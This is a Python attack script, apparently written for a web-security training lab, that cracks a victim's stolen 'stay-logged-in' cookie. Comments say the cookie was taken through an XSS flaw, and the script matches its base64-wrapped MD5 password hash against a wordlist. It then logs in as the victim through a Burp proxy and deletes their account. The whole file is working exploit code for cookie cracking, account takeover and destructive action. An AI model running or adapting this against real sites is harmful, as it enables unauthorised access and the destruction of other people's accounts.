# Uses XSS vulnerability
# This will take the returned cookie and find the MD5 match
# The password was not in the provided passwords but was added after searching for the MD5 hash online for scripting practice
# IRL would probably pass the cookie to a password cracking program

import base64
import hashlib
import pandas as pd
import sys
import requests
import urllib3


# Suppress the insecure requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Add proxy for troubleshoot, for urllib3 all proxies should use http
# Uses the Burp proxy -> Make sure Burp is running
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def cookie_bruteforce(token):
    password_list = []
    data = pd.read_csv('./burp_pass.csv')
    for passw in data:
        password_list.append(passw)

    # Do processing in single loop to be able to print password
    for pw in password_list:
        result = hashlib.md5(pw.encode())
        #print(result.hexdigest())
        md5_pw = (result.hexdigest())
        message = 'carlos:'+md5_pw
        #print(message)
        message_bytes = message.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        print(base64_message)

        if base64_message == token:
            print(f'***** {base64_message} valid stay-logged-in cookie *****')
            print(f'*** {pw} valid for carlos *****')
            return pw
            break

def delete_account(password, username, url):
    s = requests.Session()
    r1 = s.get(url+'login', proxies=proxies, verify=False)
    data = {
        "username":username,
        "password":password
    }
    r2 = s.post(url+'login',data=data, proxies=proxies, verify=False)
    r3 = s.get(url+'my-account/delete', proxies=proxies, verify=False)
    data2 = {
        "password":password
    }
    r4 = s.post(url+'my-account/delete', data=data2, proxies=proxies, verify=False)
    if 'deleted' in r4.text:
        print(f'{username} account deleted')


if __name__ == "__main__":
    try:
        token = sys.argv[1].strip()
        # Initially tried w/session cookie in case needed - testing determined not needed
        #session_cookie = sys.argv[2].strip()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} token')
        print(f'[-] Example: {sys.argv[0]} <token>')
        sys.exit(-1)
    
    
    print('[-] Performing stay-logged-in cookie brute force')
    password = cookie_bruteforce(token)
    delete = input('[+] Login and delete account? Y/n ')
    if delete == 'Y':
        username = input('Username? ')
        url = input('Base URL? ')
        print('Ok - logging in and deleting account')
        delete_account(password, username, url)





